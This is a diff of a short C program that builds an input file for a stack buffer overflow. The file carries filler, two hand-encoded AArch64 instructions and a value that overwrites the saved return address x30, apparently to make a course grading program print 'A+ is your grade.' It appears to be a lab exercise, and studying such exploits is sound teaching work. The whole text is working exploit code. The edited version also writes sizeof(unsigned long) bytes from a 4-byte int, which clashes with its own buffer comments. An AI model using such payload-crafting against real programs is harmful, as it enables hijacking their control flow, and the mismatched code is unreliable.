@@ -3,12 +3,12 @@
 int main(void)
 {
     FILE *psFile;
-    unsigned long ulData1;
+    unsigned int uiData1;
     unsigned int uiData2;
     unsigned int uiData3;
 
-    ulData1 = 0x42006c; /* address to the instructions below; */
-    uiData2 = 0x10000120; /* adr x0, 0x420074 */
+    uiData1 = 0x42006c; /* address to the instructions below; */
+    uiData2 = 0x10000110; /* adr x0, 0x420074 */
     uiData3 = 0x17FF8201; /* b 0x400874 */
 
     psFile = fopen("dataAplus", "w");
@@ -24,9 +24,9 @@ int main(void)
     fwrite(&uiData3, sizeof(unsigned int), 1, psFile);
     /* buf[28-47] */
     fprintf(psFile, "fillerfillerfillerf");
-    /* buf[48-55] (x30) */
-    fwrite(&ulData1, sizeof(unsigned long), 1, psFile);
-    /* buf[56] (new text) */
+    /* buf[48-51] (x30) */
+    fwrite(&uiData1, sizeof(unsigned long), 1, psFile);
+    /* buf[52] (new text) */
     fprintf(psFile, "A+ is your grade.\n");
     return 0;
 }
